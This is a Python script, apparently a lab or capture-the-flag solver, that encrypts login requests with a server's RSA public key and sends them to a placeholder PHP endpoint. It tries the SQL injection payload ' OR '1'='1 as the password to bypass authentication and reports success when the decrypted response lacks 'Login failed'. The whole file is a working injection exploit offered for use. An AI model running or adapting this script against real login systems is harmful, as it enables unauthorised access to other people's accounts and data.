import base64
import json
import requests
from urllib.parse import urlencode
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Random import get_random_bytes
from keys import (
    server_public_key_pem,
    client_private_key_pem,
    client_public_key_pem
)

server_public_key = RSA.import_key(server_public_key_pem)
client_private_key = RSA.import_key(client_private_key_pem)
client_public_key = RSA.import_key(client_public_key_pem)

encryptor = PKCS1_v1_5.new(server_public_key)
decryptor = PKCS1_v1_5.new(client_private_key)

URL = "http://<insert_ip>/server.php"

def debug_print(label, content):
    print(f"\n[{label}]")
    print(content)

def encrypt_payload(payload: str) -> str:
    encrypted = encryptor.encrypt(payload.encode())
    return base64.b64encode(encrypted).decode()

def decrypt_response(data: str) -> str:
    try:
        decoded = base64.b64decode(data)
        sentinel = get_random_bytes(16)
        decrypted = decryptor.decrypt(decoded, sentinel)
        return decrypted.decode()
    except Exception as e:
        return f"Decryption Failed: {e}"

def send_login_request(username: str, password: str):
    payload = {
        "action": "login",
        "username": username,
        "password": password
    }
    encoded = urlencode(payload)
    debug_print("TRY", f"Username: {username} | Password: {password}")
    debug_print("ENCODED", encoded)

    encrypted_data = encrypt_payload(encoded)
    debug_print("ENCRYPTED", encrypted_data)

    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*"
    }

    response = requests.post(URL, headers=headers, json={"data": encrypted_data})
    debug_print("RAW", response.text)

    try:
        response_json = response.json()
        if "data" in response_json:
            decrypted = decrypt_response(response_json["data"])
            debug_print("RESP", decrypted)
            return decrypted
        else:
            debug_print("WARN", "No 'data' field in response")
            return None
    except Exception as e:
        debug_print("WARN", f"Failed to parse JSON: {e}")
        return None

sql_payloads = [
    "' OR '1'='1"
]

def brute_force_sql_injection(username: str):
    for payload in sql_payloads:
        response = send_login_request(username, payload)
        if response and "Login failed" not in response:
            print(f"\n[SUCCESS] Username: {username} | Password Payload: {payload}")
            print(f"[RESPONSE] {response}")
            break

if __name__ == "__main__":
    brute_force_sql_injection("<username>")